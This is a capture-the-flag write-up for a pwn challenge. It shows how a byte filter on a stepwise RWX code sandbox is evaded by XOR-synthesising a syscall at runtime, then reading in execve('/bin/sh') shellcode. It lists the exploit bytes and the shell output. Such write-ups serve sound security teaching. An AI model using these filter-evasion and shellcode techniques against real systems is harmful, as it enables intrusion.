### Stepper

> Pwn · Hard · Iulian Schifirnet
> Points at solve: [fill in]

**Tools used**

python3 with pwntools (`work/exploit.py`; `python3 -I exploit.py` for remote, `--local` for the binary)

**Approach**

Target: `<instance>` — Files: `stepper.c`, `stepper` (x86-64 PIE, NX on, full RELRO, canary).

The program maps a 0x1000 RWX page and lets you place at most **12 chunks of ≤6 bytes** into offset 0 of that page. After each chunk the program `memset`s the first 8 bytes, copies your bytes back for the *next* step's execution, and calls `run_step`:

```
slot: [8 bytes player code][ff 25 00 00 00 00][&guest_exit]
```

So each step is: load the 16 guest registers out of a persistent `ctx[]`, `jmp [guest_rip]` into the 6-byte slot, then fall into `jmp [rip+0]` → `guest_exit`, which saves every register back into `ctx[]` and returns to the host.

Registers persist; the code slot does not. Forbidden bytes, checked per step: `0f 05 34 cd` — i.e. **no `syscall`**, no `xor eax, imm32` opcode `34`, no `int 0xcd`. That kills the obvious `execve` shellcode.

Plan:

1. Learn the guest page address with `call $+5 ; pop rax` → `rax = code+5`.
2. Derive two pointers with `lea`:
   - `rbx = rax+0x1b = code+0x20` (a scratch dword in the hlt-filled area),
   - `rsi = rax+0x3b = code+0x40` (second-stage buffer).
3. Set up a `read(0, rsi, 0x400)`:
   `xor eax,eax`, `mov edx,0x400` (fd 0 and the `rsi` buffer are already in place).
4. Patch `code+0x20` to `0f 05 ff e6` (`syscall ; jmp rsi`) with a single register-free XOR:
   `xor dword [rbx], 0x120bf1fb`, since
   `0xfffffffb ^ 0x120bf1fb = 0f 05 ff e6` and the area is `f4 f4 f4 f4`.
   (`xor eax, eax` was already used to zero eax, and both `0f`/`05` bytes are only ever created at runtime — the gate never sees them.)
5. `jmp rbx` → execute the freshly written `syscall`, which runs the queued `read()`; the bytes we appended to that same step are read straight into `code+0x40`, and the trailing `jmp rsi` jumps into them.

The second stage is unrestricted shellcode (it never passes through the byte filter), classic `execve("/bin//sh", NULL, NULL)`.

Exploit steps sent:

```
len 6  e8 00 00 00 00 58   call $+5 ; pop rax
len 4  48 8d 58 1b         lea rbx,[rax+0x1b]
len 4  48 8d 70 3b         lea rsi,[rax+0x3b]
len 2  31 c0               xor eax,eax
len 5  ba 00 04 00 00      mov edx,0x400
len 6  81 33 fb f1 0b 12   xor dword [rbx],0x120bf1fb
len 2  ff e3               jmp rbx          (+ shellcode queued on stdin)
```

Step 7 is sent as `length`, newline, the two `jmp rbx` bytes, then the second-stage shellcode, which sits in the socket/pipe waiting for the guest `read()`.

Notes / gotchas:

- `read_num` uses `strtol`, so the length line must be digits + `\n`; the code bytes are read raw with `read_exact` immediately after.
- Step 1's `call rel32` (5 bytes) conveniently pushes the next address, so the absolute address of the RWX page is recovered without any leak. Everything else is `lea` relative to it.
- The `jmp qword ptr [rip+0]` fallback after the slot forces every step to end cleanly in `guest_exit`; do not overflow past 6 bytes (the `n > STEP_SIZE` check forbids it anyway).
- `0xf4` fill makes the page safe to land in, and gives a clean `f4 f4 f4 f4` target for the XOR patch.

**Why it works**

The byte filter only inspects the chunk bytes as they are written into the slot each step — it never inspects code the guest generates at runtime. The RWX page is writable, executable, persistent, and hlt-filled, so a 4-byte XOR patch applied to a dword we control synthesizes the forbidden `0f 05` bytes in place (`f4 f4 f4 f4 ^ 0x120bf1fb = 0f 05 ff e6`). The first stage then pivots into that freshly written `syscall ; jmp rsi`, using the queued `read()` to drop a fully unrestricted second stage (`execve("/bin//sh", NULL, NULL)`) into `code+0x40`, which never passes through the filter at all.

**Validation**

```
$ echo PWNED-$((1+1)); id; cat /flag
PWNED-2
uid=10001(ctf) gid=10001 groups=10001
CSCTF{REDACTED}
```

`/flag` is a symlink to `/tmp/flag`; the container ships `serve.py`, `stepper` and the flag. Flag redacted in this writeup.
